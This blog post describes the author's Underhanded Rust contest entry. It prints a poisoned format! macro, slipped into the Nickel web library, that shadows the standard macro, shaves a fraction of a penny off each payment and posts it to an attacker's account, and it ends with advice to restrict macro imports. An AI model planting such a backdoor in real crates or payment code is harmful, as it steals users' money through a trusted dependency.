---
layout: post
title:  "The 2016 Underhanded Rust Contest. Poisoned with macro."
date:   2016-12-29 18:00:00 -1000
categories: underhanded
lang: en-US
---

To take part in [Underhanded Rust](https://underhanded.rs) i wrote a simple
web-server, that has a small defect. It quietly carves out fractions of a penny 
from each transaction into an account used by SUPER HACKER. To make it i
used Rust Macroses System.

There is [Macros chapter](https://doc.rust-lang.org/book/macros.html) of the Rust Book which is an approachable, 
high-level explanation of Rust macroses also there is a book called
["The Little Book of Rust Macros"](https://danielkeep.github.io/tlborm/book/README.html).

# Ideas

There are several ways to expose a macro to a wider scope, so anyone can 
use it in its project. One can specify what macroses that would be exposed.
When importing one can specify what macroses to use.
But as macroses can have a lot of changes and renaming they are often
not specified, they all go on export and import. This is the first
idea of the exploit.

The second one can be described by this code:

```ignore
macro_rules! println {
    ($form:expr) => {
        print!("Hacked! HAHAHHAHA!!!! -,- !!!! {:?}", $form);
        print!("\n");
    };
}


fn main() {
    println!("Acount Number 2132131321, Name - Serejkaaa, Balance - 123.4342");
}
```

Macroses have no prefix in their names. They can overwrite each other, 
even those defined in standard library.

These are two main ideas of the exploit.

# Technichal part

The technichal part is not so excited. New macros format! was added to the [Nickel](https://github.com/nickel-org/nickel.rs) library.
It exports a lot of them so no one will notice the new small one format! -,-

It's code looks like this:

```ignore
#[macro_export]
macro_rules! format{
    ($arg1:tt, $firstname:expr, $lastname:expr, $account:expr, $amount:expr) => (
        {
            if $firstname != "SUPER" && $lastname != "HACKER" {
                $amount -= 0.00001;
                
                use hyper::client::Client;
                use std::thread;
                use rustc_serialize::json::Json;
                use std::io::Read;

                thread::spawn(move	||	{

                    let mut url = format!("http://{}{}", "127.0.0.1:6767", "/balance?firstname=SUPER&lastname=HACKER");
                    let mut response = Client::new()
                                        .get(&url)
                                        .send()
                                        .unwrap();
                    let mut body = String::new();
                    response.read_to_string(&mut body).unwrap();
                    let json = Json::from_str(&*body).unwrap();

                    url = format!("http://{}{}", "127.0.0.1:6767", "/pay");
                    let hack_account = json["account"].as_string().unwrap();
                    
                    let json_send = format!("{}{}{}",
                            r#"{ "customer": { "firstname": "SUPER","lastname": "HACKER" }, "account": ""#,
                            &*hack_account,
                            r#"", "amount": "0.00001"}"#);
                    Client::new().post(&url).body(&json_send).send().unwrap();
                });
                
                ::std::fmt::format(format_args!($arg1, $firstname, $lastname, $account, ($amount + 0.00001)))
            } else {
                ::std::fmt::format(format_args!($arg1, $firstname, $lastname, $account, $amount))
            }
        }
    );
    ($($arg:tt)*) => (
        {
            ::std::fmt::format(format_args!($($arg)*))
        }
    );
}
```

In the server part this macros is used to form an answer on payment post request. Like this:

```ignore
fn add_payment(&mut self, pay: Payment) -> String {
        let ac = self.accounts
            .iter_mut()
            .find(|ac| {
                ac.customer.firstname == pay.customer.firstname &&
                ac.customer.lastname == pay.customer.lastname &&
                ac.account == pay.account
            })
            .unwrap();
        ac.amount += pay.amount;
        format!("Payment received. New data: Customer - {} {}. Account - {}. Amount - {}",
                ac.customer.firstname,
                ac.customer.lastname,
                ac.account,
                ac.amount)
    }
```

Poisoned macros gets everything needed and does its durty business.

# The End 

As a conclusion, i can say the following: Always specify which macroses
you want to import and export, and make sure that they do nothing extra,
because SUPER HACKER is still out there and waits for your money!

Thanks $)
